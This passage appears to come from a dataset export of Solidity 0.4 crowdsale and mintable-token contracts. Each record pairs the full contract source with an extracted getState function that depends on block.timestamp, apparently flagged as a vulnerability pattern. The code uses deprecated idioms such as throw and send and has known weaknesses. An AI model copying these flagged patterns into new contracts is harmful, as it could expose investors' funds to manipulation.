mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb2"
  },
  "filename": "10025.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb3"
  },
  "filename": "10129.sol",
  "content": "contract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\nlibrary SafeMathLib {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\ncontract PricingStrategy {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract CrowdsaleBase is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLib for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n mapping (address => bool) public earlyParticipantWhitelist;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event Whitelisted(address addr, bool status);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\n owner = msg.sender;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function() payable {\n throw;\n }\n function buyTokens(address receiver, uint128 customerId, uint256 tokenAmount) stopInEmergency internal returns(uint tokensBought) {\n if(getState() == State.PreFunding) {\n if(!earlyParticipantWhitelist[receiver]) {\n throw;\n }\n } else if(getState() == State.Funding) {\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n require(tokenAmount != 0);\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.plus(weiAmount);\n }\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n return tokenAmount;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {\n return buyTokens(receiver, customerId, pricingStrategy.calculatePrice(msg.value, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals()));\n }\n function calculateTokens(uint256 weisTotal, uint256 pricePerToken) public constant returns(uint tokensTotal) {\n uint multiplier = 10 ** token.decimals();\n return weisTotal.times(multiplier)/pricePerToken;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEndsAt(uint time) onlyOwner {\n if(now > time) {\n throw;\n }\n if(startsAt > time) {\n throw;\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if(msg.value == 0) throw;\n loadedRefund = loadedRefund.plus(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0) throw;\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.plus(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue)) throw;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\n else return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\n earlyParticipantWhitelist[addr] = status;\n Whitelisted(addr, status);\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) internal;\n}\nlibrary BytesDeserializer {\n function slice32(bytes b, uint offset) constant returns (bytes32) {\n bytes32 out;\n for (uint i = 0; i < 32; i++) {\n out |= bytes32(b[offset + i] & 0xFF) >> (i * 8);\n }\n return out;\n }\n function sliceAddress(bytes b, uint offset) constant returns (address) {\n bytes32 out;\n for (uint i = 0; i < 20; i++) {\n out |= bytes32(b[offset + i] & 0xFF) >> ((i+12) * 8);\n }\n return address(uint(out));\n }\n function slice16(bytes b, uint offset) constant returns (bytes16) {\n bytes16 out;\n for (uint i = 0; i < 16; i++) {\n out |= bytes16(b[offset + i] & 0xFF) >> (i * 8);\n }\n return out;\n }\n function slice4(bytes b, uint offset) constant returns (bytes4) {\n bytes4 out;\n for (uint i = 0; i < 4; i++) {\n out |= bytes4(b[offset + i] & 0xFF) >> (i * 8);\n }\n return out;\n }\n function slice2(bytes b, uint offset) constant returns (bytes2) {\n bytes2 out;\n for (uint i = 0; i < 2; i++) {\n out |= bytes2(b[offset + i] & 0xFF) >> (i * 8);\n }\n return out;\n }\n}\ncontract KYCPayloadDeserializer {\n using BytesDeserializer for 